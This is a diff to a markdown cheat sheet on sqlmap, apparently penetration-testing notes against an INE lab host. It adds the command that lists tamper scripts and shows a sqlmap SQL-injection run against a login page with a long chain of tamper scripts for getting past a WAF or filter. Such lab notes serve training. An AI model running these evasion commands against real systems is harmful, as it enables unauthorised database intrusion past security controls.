@@ -210,7 +210,13 @@ sqlmap -u 'http://demo.ine.local/index.php?page=login.php' --data="username=ss&p
 
 ```
 
-## Attempts to bypass a WAF
+## Attempts to bypass a WAF or filter
+
+Get a detailed list of the available tamper scripts and their functionality.
+
+```bash
+sqlmap --list-tamper
+```
 
 ```bash
 sqlmap -u 'http://demo.ine.local/index.php?page=login.php' -p page --threads 10 --cookie="cookie=value" --level=2 --risk=3 --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,percentage,randomcase,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
